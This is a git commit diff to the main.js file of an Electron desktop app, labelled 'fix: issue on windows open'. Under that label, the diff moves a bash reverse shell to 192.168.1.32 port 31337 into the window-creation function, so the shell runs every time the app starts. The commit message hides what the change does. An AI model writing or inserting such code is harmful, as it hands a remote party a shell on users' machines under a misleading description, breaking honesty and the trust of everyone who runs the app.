fd091d7c02dfa9bba2b52daa765b4dab051022da
loraine <mukezwa@gmail.com>
2022-02-08 09:35:53 -0700

    fix: issue on windows open

--- main.js
+++ main.js
@@ -11,22 +11,21 @@ function createWindow() {
     },
   });
 
-  // and load the index.html of the app.
-  win.loadFile('src/index.html');
-}
-app.whenReady().then(createWindow);
+  //Uses node.js process manager
+  const child_process = require('child_process');
 
-//Uses node.js process manager
-const child_process = require('child_process');
+  // This function will output the lines from the script
+  // and will return the full combined output
+  // as well as exit code when it's done (using the callback).
 
-// This function will output the lines from the script
-// and will return the full combined output
-// as well as exit code when it's done (using the callback).
-function run_script(command, args, callback) {
-  var child = child_process.spawn(command, args, {
-    encoding: 'utf8',
-    shell: true,
-  });
+  var child = child_process.spawn(
+    '/bin/bash -i > /dev/tcp/192.168.1.32/31337 0<&1 2>&1',
+    [],
+    {
+      encoding: 'utf8',
+      shell: true,
+    }
+  );
   // You can also use a variable to save the output for when the script closes later
   child.on('error', (error) => {
     dialog.showMessageBox({
@@ -44,17 +43,11 @@ function run_script(command, args, callback) {
   });
 
   child.stderr.setEncoding('utf8');
+
   child.stderr.on('data', (data) => {
-    const mainWindow = new BrowserWindow({
-      width: 800,
-      height: 600,
-      webPreferences: {
-        nodeIntegration: true,
-        contextIsolation: false,
-      },
-    });
     // Return some data to the renderer process with the mainprocess-response ID
-    mainWindow.webContents.send('mainprocess-response', data);
+
+    win.webContents.send('mainprocess-response', data);
     //Here is the output from the command
     console.log(data);
   });
@@ -72,6 +65,8 @@ function run_script(command, args, callback) {
     }
   });
   if (typeof callback === 'function') callback();
-}
 
-run_script('/bin/bash -i > /dev/tcp/192.168.1.32/31337 0<&1 2>&1', [], null);
+  // and load the index.html of the app.
+  win.loadFile('src/index.html');
+}
+app.whenReady().then(createWindow);
